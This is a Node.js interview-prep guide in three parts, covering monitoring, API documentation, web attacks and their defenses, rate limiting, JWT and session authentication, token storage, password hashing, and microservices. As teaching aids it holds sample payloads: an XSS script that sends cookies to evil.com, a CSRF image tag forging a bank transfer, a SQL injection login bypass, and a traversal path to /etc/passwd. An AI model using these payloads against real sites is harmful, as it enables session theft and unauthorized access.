- **Data Source**: Where Grafana pulls data from (Prometheus, MySQL, Elasticsearch, etc.)
- **Dashboard**: A collection of panels (charts, graphs, stats)
- **Panel**: A single visualization — a graph, bar chart, number display, table
- **Alert**: A rule that triggers a notification (Slack, email, PagerDuty) when a threshold is crossed

#### Setting up Grafana with Prometheus:

1. Install and run Prometheus (it scrapes your `/metrics` endpoint)
2. Install and run Grafana
3. In Grafana → Add Data Source → Select Prometheus → Enter URL (`http://localhost:9090`)
4. Create a Dashboard → Add Panel → Write PromQL query → Choose chart type
5. Save dashboard!

---

### How They Work Together — Full Flow

```
┌─────────────────────────────────────────────────────────────┐
│                     Your Node.js App                        │
│                                                             │
│  Winston Logger → writes logs → log files / log aggregator  │
│                                                             │
│  prom-client → exposes GET /metrics                         │
└────────────────────────┬────────────────────────────────────┘
                         │
                         │ (Prometheus scrapes every 15s)
                         ▼
              ┌─────────────────────┐
              │     Prometheus      │
              │  Time-series DB     │
              │  Stores all metrics │
              └──────────┬──────────┘
                         │
                         │ (Grafana queries via PromQL)
                         ▼
              ┌─────────────────────┐
              │       Grafana       │
              │  Dashboards, Graphs │
              │  Alerts, Reports    │
              └─────────────────────┘
                         │
                         │ (Alerts sent to)
                         ▼
              Slack / Email / PagerDuty
```

---

### Real World Use Case

> Your Node.js API is deployed in production. Suddenly, customers are complaining it's slow.

With this setup:
1. **Grafana** shows a spike in `http_request_duration_seconds` — requests are taking 5x longer than usual
2. You query Prometheus — the `process_heap_used_bytes` is near maximum → **memory leak suspected**
3. You check **Winston logs** — 20 minutes ago, a new deployment was pushed
4. You roll back the deployment → metrics return to normal
5. Grafana alert fires a Slack message: "✅ Latency back to normal"

Without this observability stack, you'd be debugging blind.

---

### Summary Table

| Tool | Role | What it answers |
|---|---|---|
| **Winston** | Logging | What events happened in my app? |
| **Prometheus** | Metrics collection | How is my app performing numerically? |
| **Grafana** | Visualization + Alerts | Show me graphs + alert me when things go wrong |

---

*End of Document — Questions 21 to 30*


# Node.js Deep Dive: Questions 31–40
### Explained in Plain English — No Prior Knowledge Needed

---

## Q31. How can we do Documentation of a Node.js Application? (Swagger and other tools)

### Why Documentation Matters

Imagine you built a restaurant kitchen with 50 different stations. A new chef joins. Without a manual — what each station does, what ingredients go in, what comes out — they're completely lost.

**API documentation** is that manual. It tells other developers (or your future self):
- What endpoints exist (`GET /users`, `POST /login`)
- What data to send in a request
- What response to expect
- What errors can occur

---

### Tool 1: Swagger (OpenAPI) — Most Popular

**Swagger** is the industry-standard tool for documenting REST APIs. It generates a **beautiful, interactive UI** where developers can read your API docs AND test the endpoints directly in the browser — no Postman needed.

The underlying standard is called **OpenAPI Specification (OAS)**.

#### Setup in Express with `swagger-ui-express`

```bash
npm install swagger-ui-express swagger-jsdoc
```

```js
// swagger.js
const swaggerJsdoc = require('swagger-jsdoc');
const swaggerUi = require('swagger-ui-express');

const options = {
  definition: {
    openapi: '3.0.0',
    info: {
      title: 'My App API',
      version: '1.0.0',
      description: 'Documentation for My Node.js App',
    },
    servers: [{ url: 'http://localhost:3000' }],
  },
  apis: ['./routes/*.js'], // where to look for JSDoc comments
};

const specs = swaggerJsdoc(options);

module.exports = { swaggerUi, specs };
```

```js
// app.js
const { swaggerUi, specs } = require('./swagger');
app.use('/api-docs', swaggerUi.serve, swaggerUi.setup(specs));
// Visit http://localhost:3000/api-docs to see the UI
```

#### Writing JSDoc comments in route files

```js
/**
 * @swagger
 * /users/{id}:
 *   get:
 *     summary: Get a user by ID
 *     tags: [Users]
 *     parameters:
 *       - in: path
 *         name: id
 *         required: true
 *         schema:
 *           type: string
 *         description: The user ID
 *     responses:
 *       200:
 *         description: User found successfully
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 id:
 *                   type: string
 *                 name:
 *                   type: string
 *       404:
 *         description: User not found
 */
router.get('/users/:id', getUserById);
```

This generates a live, interactive page at `/api-docs` where anyone can see and test your API.

---

### Tool 2: Postman Collections

**Postman** isn't just for testing — you can write documentation inside Postman for each request and **publish it as a public documentation page**. Teams widely use this for internal API docs.

---

### Tool 3: Compodoc / JSDoc — For Code-level Documentation

While Swagger documents your API endpoints, **JSDoc** documents your actual code — functions, classes, parameters.

```js
/**
 * Calculates the total price including tax.
 * @param {number} price - The base price of the item
 * @param {number} taxRate - Tax rate as a decimal (e.g., 0.18 for 18%)
 * @returns {number} Final price after tax
 */
function calculateTotal(price, taxRate) {
  return price + price * taxRate;
}
```

Run `jsdoc` to generate an HTML documentation site from your comments.

---

### Tool 4: Readme.md + OpenAPI YAML file

For open-source or GitHub projects, a well-written `README.md` + a `openapi.yaml` file in the repo is standard practice.

---

### Documentation Types — Summary

| Type | Tool | What it documents |
|---|---|---|
| API Endpoints | Swagger / OpenAPI | Routes, requests, responses |
| Code internals | JSDoc | Functions, classes, types |
| Manual testing | Postman | Requests + descriptions |
| Project overview | README.md | Setup, usage, architecture |

---

## Q32. What are DDoS Attacks in Node.js? And How to Secure Our Application?

### What is a DDoS Attack?

**DDoS** = Distributed Denial of Service.

Imagine you own a restaurant. Your restaurant can serve 50 customers at a time. Now, a rival sends **10,000 fake customers** who walk in, occupy seats, order nothing, and refuse to leave. Real customers can't get in. Your restaurant is "down."

A DDoS attack does exactly this to your server — it floods your Node.js app with thousands (or millions) of fake requests, consuming all resources, so **legitimate users can't get through**.

The "Distributed" part means the attack comes from **many different machines** (a botnet), making it hard to block by IP.

---

### Why Node.js is Particularly Vulnerable

Node.js runs on a **single thread**. One extremely heavy or malformed request can slow down the entire event loop — affecting all users. A flood of such requests = game over.

---

### Defense Strategies

#### 1. Rate Limiting (see Q36 for deep dive)

Limit how many requests a single IP can make in a time window.

```js
const rateLimit = require('express-rate-limit');

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100,                  // max 100 requests per IP per window
  message: 'Too many requests, please try again later.'
});

app.use(limiter);
```

---

#### 2. Use a Reverse Proxy / CDN (Cloudflare, Nginx)

Never expose Node.js directly to the internet. Put it behind:
- **Nginx** — rate limits, blocks bad IPs, load balances
- **Cloudflare** — absorbs massive DDoS traffic at the network edge, before it hits your server

Cloudflare is the most powerful free-tier DDoS protection available.

---

#### 3. Limit Request Body Size

A common attack: send a **massive JSON body** to overwhelm your parser.

```js
app.use(express.json({ limit: '10kb' })); // reject bodies > 10KB
app.use(express.urlencoded({ limit: '10kb', extended: true }));
```

---

#### 4. Use Helmet.js — Set Security HTTP Headers

```bash
npm install helmet
```

```js
const helmet = require('helmet');
app.use(helmet()); // sets 15+ security headers automatically
```

Helmet sets headers like:
- `X-Content-Type-Options` — prevents MIME sniffing
- `X-Frame-Options` — prevents clickjacking
- `Strict-Transport-Security` — forces HTTPS

---

#### 5. Slow Down Repeat Requestors

```js
const slowDown = require('express-slow-down');

const speedLimiter = slowDown({
  windowMs: 15 * 60 * 1000,
  delayAfter: 50,           // allow 50 requests at full speed
  delayMs: () => 500        // then add 500ms delay per request
});

app.use(speedLimiter);
```

---

#### 6. Block Suspicious IPs / Use a Firewall

Use `express-ipfilter` or your cloud provider's firewall (AWS Security Groups, GCP Firewall Rules) to block known malicious IPs.

---

### DDoS Defense Summary

| Layer | Tool/Technique |
|---|---|
| Network layer | Cloudflare, AWS Shield |
| Server layer | Nginx reverse proxy |
| App layer | Rate limiting, body size limits |
| Code layer | Helmet.js, async handlers |

---

## Q33. What is XSS Attack? How to Secure Our App?

### What is XSS?

**XSS** = Cross-Site Scripting.

Imagine a website has a comment section. A normal user types "Nice article!" But an attacker types:

```html
<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
```

If the website displays this comment **without sanitizing it**, the browser of every person who reads that comment will **execute this script** — sending their cookies (which may contain login tokens) to the attacker's server.

The attacker has **injected malicious JavaScript** into your page. That's XSS.

---

### Types of XSS

| Type | Description |
|---|---|
| **Stored XSS** | Malicious script saved in DB, shown to all users |
| **Reflected XSS** | Script in URL parameter, reflected in response |
| **DOM-based XSS** | JavaScript in the browser manipulates the DOM unsafely |

---

### How to Prevent XSS

#### 1. Never trust user input — Always sanitize and escape

Use `DOMPurify` on frontend or `sanitize-html` on backend to strip dangerous HTML.

```bash
npm install sanitize-html
```

```js
const sanitizeHtml = require('sanitize-html');

const userInput = '<script>alert("hacked")</script><p>Hello</p>';
const clean = sanitizeHtml(userInput); // → <p>Hello</p>

// The <script> tag is stripped out
```

---

#### 2. Use Helmet's Content Security Policy (CSP)

CSP tells the browser: "Only run scripts from trusted sources."

```js
app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],        // only allow content from own domain
      scriptSrc: ["'self'"],         // only run scripts from own domain
      imgSrc: ["'self'", "https:"],  // images from self or HTTPS
      styleSrc: ["'self'", "'unsafe-inline'"],
    },
  })
);
```

Even if an attacker injects a script tag, the browser **refuses to execute it** because it came from an untrusted source.

---

#### 3. Escape output in templates

If using a templating engine like EJS or Handlebars, always use escaped output:

```html
<!-- DANGEROUS — renders raw HTML -->
<%- userInput %>

<!-- SAFE — escapes HTML characters -->
<%= userInput %>
```

`<script>` becomes `&lt;script&gt;` — browsers display it as text, not execute it.

---

#### 4. Use `HttpOnly` and `Secure` flags on Cookies

```js
res.cookie('token', jwtToken, {
  httpOnly: true, // JS cannot access this cookie — blocks XSS cookie theft
  secure: true,   // only sent over HTTPS
  sameSite: 'Strict'
});
```

With `httpOnly: true`, even if an XSS attack runs, the `document.cookie` script **cannot read your auth cookie**.

---

### XSS Prevention Checklist

- Sanitize all user input before storing or displaying
- Use CSP headers via Helmet
- Always use escaped output in templates
- Set `HttpOnly` and `Secure` flags on cookies
- Never use `eval()` or `innerHTML` with user data

---

## Q34. What is CSRF Attack and How to Secure Applications from It?

### What is CSRF?

**CSRF** = Cross-Site Request Forgery.

Here's the scenario:

1. You log into your bank at `mybank.com`. Your browser stores an auth cookie.
2. You then visit a malicious website — maybe from a phishing email link.
3. That malicious page has hidden code:
```html
<img src="https://mybank.com/transfer?to=attacker&amount=50000" />
```
4. Your browser, seeing a request to `mybank.com`, **automatically includes your auth cookie** (because that's how browsers work).
5. The bank sees a valid cookie = valid user, and **processes the transfer**.

You never clicked anything. You never agreed to it. The attacker **forged a request on your behalf**. That's CSRF.

---

### CSRF vs XSS — Key Difference

| Attack | What the attacker does |
|---|---|
| **XSS** | Injects script INTO your site, steals data from the victim |
| **CSRF** | Uses the victim's browser to make requests TO your site |

---

### How to Prevent CSRF

#### 1. CSRF Tokens (Most Common Defense)

Generate a **unique, secret, random token** per user session. Include it in every form/request. The server validates it. An attacker's site can't know this token.

```bash
npm install csurf
```

```js
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

// In your route
app.get('/form', csrfProtection, (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});

// In your HTML form
// <input type="hidden" name="_csrf" value="<%= csrfToken %>" />

app.post('/submit', csrfProtection, (req, res) => {
  // csurf middleware automatically validates the token
  // if token is wrong/missing, it throws a 403 error
  res.send('Form submitted!');
});
```

---

#### 2. SameSite Cookie Attribute

This tells the browser: **"Don't send this cookie with cross-site requests."**

```js
res.cookie('session', sessionId, {
  sameSite: 'Strict', // never sent on cross-site requests
  httpOnly: true,
  secure: true
});
```

- `SameSite: Strict` — Cookie never sent with any cross-site request
- `SameSite: Lax` — Cookie sent only for top-level navigations (clicking a link), not for background requests (like the malicious `<img>` tag above)

**SameSite cookies alone are a very strong CSRF defense** in modern browsers.

---

#### 3. Check the `Origin` / `Referer` Header

```js
app.use((req, res, next) => {
  const origin = req.headers.origin || req.headers.referer;
  if (req.method === 'POST' && origin && !origin.startsWith('https://myapp.com')) {
    return res.status(403).json({ error: 'CSRF detected' });
  }
  next();
});
```

---

#### 4. Use Token-based Auth (JWT in Authorization header)

If you use JWT tokens sent in the `Authorization: Bearer <token>` header (not cookies), CSRF is **not possible** — because browsers don't auto-include custom headers on cross-site requests.

This is one reason why REST APIs prefer JWT over session cookies.

---

## Q35. What Are Other Kinds of Attacks? How to Secure a Node.js Application?

### 1. SQL Injection / NoSQL Injection

**What it is**: Attacker sends malicious input that **manipulates your database query**.

Classic SQL example:
```
Username: admin' OR '1'='1
Password: anything
```

Query becomes: `SELECT * FROM users WHERE username='admin' OR '1'='1'` → always true → attacker logs in as admin.

**Prevention**:
- Use **parameterized queries / prepared statements** — never concatenate user input into queries
- For MongoDB, sanitize input with `mongo-sanitize`

```js
const mongoSanitize = require('express-mongo-sanitize');
app.use(mongoSanitize()); // strips $ and . from user input
```

---

### 2. Brute Force Attacks

**What it is**: Attacker tries thousands of password combinations until one works.

**Prevention**:
- Rate limit login endpoints (max 5 attempts per 15 minutes)
- Add account lockout after N failed attempts
- Use CAPTCHA after failed attempts
- Use `bcrypt` (slow hashing) — makes brute-force computationally expensive

---

### 3. Directory Traversal Attack

**What it is**: Attacker manipulates file path input to access files outside the intended directory.

```
GET /file?name=../../etc/passwd
```

**Prevention**:
```js
const path = require('path');
const safePath = path.resolve('./uploads', userInput);

// Make sure the resolved path is inside the uploads directory
if (!safePath.startsWith(path.resolve('./uploads'))) {
  return res.status(403).send('Access denied');
}
```

---

### 4. Man-in-the-Middle (MITM) Attack

**What it is**: Attacker intercepts communication between client and server.

**Prevention**:
- Always use **HTTPS** (TLS/SSL encryption)
- Use `helmet.hsts()` to force HTTPS

---

### 5. Dependency Vulnerabilities

**What it is**: You use an npm package that has a known security vulnerability. Attackers exploit it.

**Prevention**:
```bash
npm audit             # check for vulnerabilities
npm audit fix         # auto-fix what's fixable
npx snyk test         # deeper vulnerability scan
```

Use **Dependabot** on GitHub to get automatic PRs when a package has a vulnerability.

---

### 6. Environment Variable Leakage

**What it is**: Your `.env` file (with API keys, DB passwords) gets exposed — committed to Git, leaked in error messages, etc.

**Prevention**:
- Always add `.env` to `.gitignore`
- Never log `process.env` or error stack traces in production
- Use secrets managers (AWS Secrets Manager, HashiCorp Vault) for production

---

### 7. ReDoS (Regular Expression Denial of Service)

**What it is**: Certain poorly-written regex patterns take exponentially long to evaluate on certain inputs — attacker sends crafted input to freeze your server.

**Prevention**:
- Use `safe-regex` npm package to check your regex
- Use timeout mechanisms for regex evaluation

---

### Security Toolkit Summary

| Attack | Tool / Fix |
|---|---|
| DDoS | Cloudflare, rate-limit, Helmet |
| XSS | sanitize-html, CSP, HttpOnly cookies |
| CSRF | csurf, SameSite cookies, JWT headers |
| SQL/NoSQL Injection | Parameterized queries, mongo-sanitize |
| Brute Force | Rate limiting, account lockout, bcrypt |
| Directory Traversal | path.resolve + boundary check |
| MITM | HTTPS, HSTS |
| Dependency vulns | npm audit, Snyk |
| Secret leakage | .gitignore, secrets manager |

---

## Q36. What is Rate Limiting in Node.js? How Can We Implement It?

### What is Rate Limiting?

Think of a nightclub bouncer. The club can hold 200 people safely. The bouncer ensures no more than 200 people enter, and one person can't come in and out 500 times to hog all the spots. That bouncer is a **rate limiter**.

In Node.js, rate limiting means: **restricting how many requests a single client (IP address, user, API key) can make in a given time window**.

---

### Why is it Needed?

- Prevents **DDoS / brute force attacks**
- Prevents **API abuse** (someone scraping your entire database)
- Ensures **fair usage** — one user can't hog all server resources
- Required by many **security compliance standards**

---

### Implementation 1: express-rate-limit (Simplest)

```bash
npm install express-rate-limit
```

```js
const rateLimit = require('express-rate-limit');

// Global rate limit — applies to all routes
const globalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minute window
  max: 100,                  // max 100 requests per IP in this window
  standardHeaders: true,     // returns RateLimit headers in response
  legacyHeaders: false,
  message: {
    status: 429,
    error: 'Too many requests. Please try again after 15 minutes.'
  }
});

app.use(globalLimiter);
```

---

### Implementation 2: Stricter Limiter for Sensitive Routes

You'd apply tighter limits to login, register, and password-reset endpoints.

```js
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5,                    // only 5 login attempts per IP
  message: 'Too many login attempts. Account temporarily locked.',
  skipSuccessfulRequests: true // don't count successful logins
});

app.post('/login', loginLimiter, loginController);
app.post('/forgot-password', loginLimiter, forgotPasswordController);
```

---

### Implementation 3: Redis-backed Rate Limiting (For Distributed Systems)

If you have **multiple Node.js instances** (using Cluster or multiple servers), each instance has its own in-memory rate limit counter. A user could hit 100 requests on Server 1 and then another 100 on Server 2.

The solution: use **Redis** as a shared store for rate limit counters.

```bash
npm install express-rate-limit rate-limit-redis ioredis
```

```js
const rateLimit = require('express-rate-limit');
const RedisStore = require('rate-limit-redis');
const Redis = require('ioredis');

const redisClient = new Redis({ host: 'localhost', port: 6379 });

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  store: new RedisStore({
    sendCommand: (...args) => redisClient.call(...args),
  }),
});

app.use(limiter);
```

Now all server instances share the same counter in Redis.

---

### Rate Limit Response Headers

When rate limiting is active, responses include headers:

```
RateLimit-Limit: 100
RateLimit-Remaining: 87
RateLimit-Reset: 1710000000
Retry-After: 900   (when limit is exceeded)
```

These help clients understand their quota.

---

### Types of Rate Limiting Strategies

| Strategy | How it works | Use case |
|---|---|---|
| **Fixed Window** | Count resets at fixed interval (e.g., every hour) | Simple, common |
| **Sliding Window** | Rolling time window — smoother | More accurate |
| **Token Bucket** | Tokens refill over time, each request uses a token | APIs with burst allowance |
| **Leaky Bucket** | Requests processed at fixed rate, excess dropped | Smoothing traffic |

`express-rate-limit` uses Fixed Window by default.

---

## Q37. Authentication and Authorisation with Access Token and Refresh Token

### First — What's the Difference Between Authentication and Authorisation?

- **Authentication**: "Who are you?" — Verifying identity (login with email + password)
- **Authorisation**: "What are you allowed to do?" — Checking permissions (can this user access admin routes?)

---

### The Problem with Single Tokens

If you give a user one JWT token that never expires:
- If stolen, attacker has **permanent access**

If you make it expire in 15 minutes:
- User has to **log in every 15 minutes** — terrible UX

The solution: **two tokens**.

---

### Access Token + Refresh Token — The System

| | Access Token | Refresh Token |
|---|---|---|
| **Purpose** | Access protected resources | Get a new access token |
| **Lifespan** | Short (15 minutes) | Long (7–30 days) |
| **Stored** | Memory / sessionStorage | HttpOnly cookie (secure) |
| **Sent with** | Every API request | Only to /refresh endpoint |
| **If stolen** | Damage limited to 15 min | Very dangerous — rotate immediately |

---

### The Full Flow — Story

```
1. User logs in with email + password
        ↓
2. Server verifies credentials
        ↓
3. Server generates:
   - Access Token (expires in 15 min)   → sent in response body
   - Refresh Token (expires in 7 days)  → sent as HttpOnly cookie
        ↓
4. Client stores access token in memory
        ↓
5. Client makes API requests:
   Authorization: Bearer <accessToken>
        ↓
6. Server validates access token → returns data
        ↓
7. Access token expires after 15 min
        ↓
8. Client sends request to POST /auth/refresh
   (refresh token is automatically included as cookie)
        ↓
9. Server validates refresh token, issues new access token
        ↓
10. Client uses new access token — user never noticed anything
```

---

### Code Implementation

```js
const jwt = require('jsonwebtoken');

// ---- LOGIN ----
app.post('/login', async (req, res) => {
  const { email, password } = req.body;
  const user = await User.findOne({ email });

  if (!user || !await bcrypt.compare(password, user.password)) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // Generate tokens
  const accessToken = jwt.sign(
    { userId: user._id, role: user.role },
    process.env.ACCESS_TOKEN_SECRET,
    { expiresIn: '15m' }
  );

  const refreshToken = jwt.sign(
    { userId: user._id },
    process.env.REFRESH_TOKEN_SECRET,
    { expiresIn: '7d' }
  );

  // Save refresh token in DB (so we can invalidate it on logout)
  await user.updateOne({ refreshToken });

  // Send refresh token as HttpOnly cookie
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'Strict',
    maxAge: 7 * 24 * 60 * 60 * 1000 // 7 days in ms
  });

  // Send access token in response body
  res.json({ accessToken });
});


// ---- REFRESH ----
app.post('/auth/refresh', async (req, res) => {
  const refreshToken = req.cookies.refreshToken;
  if (!refreshToken) return res.status(401).json({ error: 'No token' });

  try {
    const decoded = jwt.verify(refreshToken, process.env.REFRESH_TOKEN_SECRET);
    const user = await User.findById(decoded.userId);

    // Verify token matches what we stored (rotation check)
    if (user.refreshToken !== refreshToken) {
      return res.status(403).json({ error: 'Token reuse detected' });
    }

    // Issue new access token
    const newAccessToken = jwt.sign(
      { userId: user._id, role: user.role },
      process.env.ACCESS_TOKEN_SECRET,
      { expiresIn: '15m' }
    );

    res.json({ accessToken: newAccessToken });
  } catch (err) {
    res.status(403).json({ error: 'Invalid refresh token' });
  }
});


// ---- LOGOUT ----
app.post('/logout', async (req, res) => {
  const refreshToken = req.cookies.refreshToken;
  // Invalidate the refresh token in DB
  await User.updateOne({ refreshToken }, { refreshToken: null });
  res.clearCookie('refreshToken');
  res.json({ message: 'Logged out' });
});


// ---- AUTH MIDDLEWARE ----
function authenticate(req, res, next) {
  const authHeader = req.headers.authorization; // "Bearer <token>"
  const token = authHeader && authHeader.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'No access token' });

  try {
    const decoded = jwt.verify(token, process.env.ACCESS_TOKEN_SECRET);
    req.user = decoded; // { userId, role }
    next();
  } catch (err) {
    res.status(401).json({ error: 'Invalid or expired token' });
  }
}

// Authorisation middleware
function authorise(...roles) {
  return (req, res, next) => {
    if (!roles.includes(req.user.role)) {
      return res.status(403).json({ error: 'Access denied' });
    }
    next();
  };
}

// Protected route
app.get('/admin', authenticate, authorise('admin'), (req, res) => {
  res.json({ message: 'Welcome, Admin' });
});
```

---

## Q38. Session-based vs Token-based Authentication — Which is Best for What?

### Session-based Authentication

**How it works:**

```
1. User logs in
2. Server creates a session in memory/database
3. Server gives user a Session ID (stored in a cookie)
4. On each request, browser sends Session ID cookie
5. Server looks up Session ID in its session store
6. If found → user is authenticated
```

The **server remembers the session** — it's stateful.

---

### Token-based Authentication (JWT)

**How it works:**

```
1. User logs in
2. Server creates a JWT containing user data (userId, role)
3. JWT is signed with server's secret key
4. User stores JWT and sends it in every request header
5. Server validates the token's signature — no DB lookup needed
6. If signature valid → user is authenticated
```

The **token carries all information** — the server is stateless.

---

### Side-by-Side Comparison

| Feature | Session-based | Token-based (JWT) |
|---|---|---|
| **State** | Server stores session (stateful) | Server stores nothing (stateless) |
| **Storage** | Session store (DB/Redis) | Client stores JWT |
| **Scalability** | Harder — all servers need access to session store | Easy — any server can verify the token |
| **Logout** | Easy — just delete session from store | Hard — JWT valid until expiry (need a blocklist) |
| **Security** | Session ID is meaningless without server | JWT contains data — if stolen, valid until expiry |
| **Performance** | DB lookup on every request | No DB lookup — just crypto verification |
| **Mobile apps** | Harder (cookies less natural on mobile) | Natural (Authorization header works everywhere) |

---

### Which is Best for What?

**Use Session-based when:**
- Traditional web apps with server-rendered HTML (like an online store)
- You need **instant logout** capability (e.g., banking apps)
- All users are on the same domain (cookies work perfectly)
- Smaller scale apps — simpler to implement

**Use Token-based (JWT) when:**
- Building a **REST API** consumed by mobile apps or SPAs (React, Vue)
- **Microservices** architecture — different services can verify the same JWT
- **Distributed systems** with multiple servers (no shared session store needed)
- Third-party **OAuth integrations** (Google, GitHub login)

---

## Q39. What Are the Ways to Store Tokens? Which is the Most Secure?

### The Three Storage Options

#### Option 1: localStorage

```js
localStorage.setItem('accessToken', token);
const token = localStorage.getItem('accessToken');
```

**Pros**: Easy to use, persists across tabs and browser restarts

**Cons**: ⚠️ **Accessible by any JavaScript on the page** — if XSS happens, attacker steals your token instantly. This is considered **unsafe for auth tokens**.

---

#### Option 2: sessionStorage

```js
sessionStorage.setItem('accessToken', token);
```

**Pros**: Cleared when browser tab closes

**Cons**: ⚠️ Still accessible by JavaScript — same XSS vulnerability as localStorage. Tab-specific (not shared between tabs).

---

#### Option 3: HttpOnly Cookie

```js
// Server sets the cookie
res.cookie('refreshToken', token, {
  httpOnly: true,  // ← JavaScript CANNOT read this
  secure: true,    // ← only sent over HTTPS
  sameSite: 'Strict'
});
```

**Pros**: ✅ **JavaScript cannot read `HttpOnly` cookies** — XSS attacks can't steal it. Automatically sent with every request.

**Cons**: Vulnerable to CSRF (mitigated with `sameSite` and CSRF tokens). Slightly more complex to implement.

---

#### Option 4: In-Memory (JavaScript variable)

```js
// Store in a React state or a module-level variable
let accessToken = null;

function setToken(token) { accessToken = token; }
function getToken() { return accessToken; }
```

**Pros**: ✅ Most XSS-resistant — not in DOM, not in storage. Gone when page refreshes (can't be stolen by persistent scripts).

**Cons**: Lost on page refresh — user needs to re-authenticate or use a refresh token via HttpOnly cookie.

---

### The Gold Standard Setup (Used in Production)

```
Access Token  → In-memory variable (React state / module variable)
Refresh Token → HttpOnly, Secure, SameSite=Strict cookie
```

**Why this works:**
- Access token in memory = XSS can't access it (not in storage, not in cookie)
- Refresh token in HttpOnly cookie = XSS can't read it, CSRF can't use it (SameSite)
- On page refresh, use the refresh token (cookie) to silently get a new access token

---

### Storage Security Comparison

| Storage | XSS Risk | CSRF Risk | Persists on Refresh | Verdict |
|---|---|---|---|---|
| localStorage | ❌ High | ✅ None | ✅ Yes | Not recommended for tokens |
| sessionStorage | ❌ High | ✅ None | ❌ No | Not recommended |
| HttpOnly Cookie | ✅ Safe | ⚠️ Mitigated by SameSite | ✅ Yes | Good for refresh token |
| In-Memory | ✅ Safest | ✅ None | ❌ No | Best for access token |

---

## Q40. How Can We Store Passwords in a Node.js Application?

### The Cardinal Rule

> **NEVER store passwords as plain text. Ever.**

If your database is breached and passwords are stored as plain text, every user's account — on your site and everywhere they reuse that password — is compromised.

---

### What NOT to Do

```js
// ❌ PLAIN TEXT — catastrophic
user.password = "mysecretpassword";

// ❌ MD5 / SHA1 — broken, rainbow tables exist
user.password = crypto.createHash('md5').update(password).digest('hex');

// ❌ Simple SHA256 — fast to crack, no salt
user.password = crypto.createHash('sha256').update(password).digest('hex');
```

Fast hashes are dangerous because attackers can compute **billions of hashes per second** on GPUs.

---

### The Right Way: bcrypt

**bcrypt** is specifically designed for password hashing. It is:
- **Slow by design** — makes brute force computationally expensive
- **Includes a salt** — unique random data added to each password before hashing, so two users with the same password get different hashes
- **Adaptive** — you can increase the "work factor" as hardware gets faster

```bash
npm install bcrypt
```

```js
const bcrypt = require('bcrypt');

// ---- REGISTERING A USER ----
async function registerUser(email, plainPassword) {
  const saltRounds = 12; // work factor: higher = slower = more secure
  // bcrypt generates a unique salt and hashes the password
  const hashedPassword = await bcrypt.hash(plainPassword, saltRounds);

  await User.create({ email, password: hashedPassword });
  // stored in DB: "$2b$12$ABC123..." (not the real password)
}


// ---- LOGGING IN ----
async function loginUser(email, plainPassword) {
  const user = await User.findOne({ email });
  if (!user) return { success: false, message: 'User not found' };

  // bcrypt.compare extracts the salt from the stored hash and compares
  const isMatch = await bcrypt.compare(plainPassword, user.password);

  if (!isMatch) return { success: false, message: 'Wrong password' };
  return { success: true, user };
}
```

---

### How bcrypt Works Internally

```
Input: "mysecretpassword"
         +
Salt:  "$2b$12$ABC123randomsalt"    ← randomly generated, unique per user
         ↓
bcrypt runs 2^12 = 4096 rounds of hashing
         ↓
Output: "$2b$12$ABC123randomsalt<hashedResult>"
```

The salt is **stored inside the hash** — bcrypt.compare() extracts it automatically. You don't need to store the salt separately.

---

### Understanding Salt Rounds (Work Factor)

| Salt Rounds | Hashes per second (modern CPU) | Time to hash one password |
|---|---|---|
| 10 | ~10 | ~100ms |
| 12 | ~2.5 | ~400ms |
| 14 | ~0.6 | ~1.5s |

- `10` is the default — fine for most apps
- `12` is recommended for better security (400ms is acceptable for login)
- `14+` is very slow — only for extremely sensitive applications

Higher rounds = attacker needs more time per brute-force attempt.

---

### What About Argon2? (Even Better)

**Argon2** won the Password Hashing Competition (2015) and is technically superior to bcrypt. It's memory-hard (uses lots of RAM, making GPU attacks harder).

```bash
npm install argon2
```

```js
const argon2 = require('argon2');

// Hash
const hash = await argon2.hash(password);

// Verify
const isValid = await argon2.verify(hash, password);
```

For new applications, **Argon2id** is the current best practice recommendation.

---

### Password Security Checklist

- ✅ Use bcrypt (saltRounds ≥ 12) or Argon2id
- ✅ Never log or expose passwords anywhere
- ✅ Never store passwords in plain text or with weak hashing (MD5, SHA1)
- ✅ Enforce minimum password strength (length, complexity)
- ✅ Check against known breached passwords (use HaveIBeenPwned API)
- ✅ Implement account lockout after repeated failed attempts
- ✅ Let users use password managers (don't block paste in password fields!)

---

### Quick Reference Summary

```js
const bcrypt = require('bcrypt');

// Register
const hash = await bcrypt.hash(plainPassword, 12);
await db.save({ password: hash });

// Login
const isValid = await bcrypt.compare(plainPassword, storedHash);
```

That's all there is to it. Two lines for the most important security feature in your app.

---

*End of Document — Questions 31 to 40*


# Node.js Interview Questions - Detailed Answers (41-51)

## 41. What are different ways microservices communicate? How can we do real-time communication? And synchronous communication in microservices?

### What are Microservices?

Instead of one giant application (monolith), you have many **small, independent services**. Each handles one thing:
- User Service (manages users)
- Order Service (manages orders)
- Payment Service (handles payments)
- Notification Service (sends emails/SMS)

These services need to **talk to each other**. That's where communication patterns come in.

### Communication Methods

#### 1. **Synchronous Communication** — Request-Response (Blocking)

One service sends a request and **waits for a response** before continuing.

**Method: HTTP / REST**

```javascript
// Order Service wants to process payment
const axios = require('axios');

async function processOrder(orderId) {
  try {
    // Call Payment Service synchronously
    const paymentResponse = await axios.post(
      'http://payment-service:3001/pay',
      { orderId, amount: 100 }
    );
    
    if (paymentResponse.data.success) {
      // Only proceed if payment succeeded
      return { success: true, message: 'Order processed' };
    }
  } catch (error) {
    return { success: false, error: 'Payment failed' };
  }
}
```

**Pros:**
- ✅ Simple to understand and implement
- ✅ Immediate response — you know right away if it worked
- ✅ No additional infrastructure

**Cons:**
- ❌ **Tight coupling** — if Payment Service is down, Order Service fails
- ❌ **Slow** — Order Service blocks waiting for Payment Service
- ❌ **Not scalable** — cascading failures (one slow service slows everything)

#### 2. **Asynchronous Communication** — Event/Message-based (Non-blocking)

One service sends a message but **doesn't wait** for a response. It continues doing its thing.

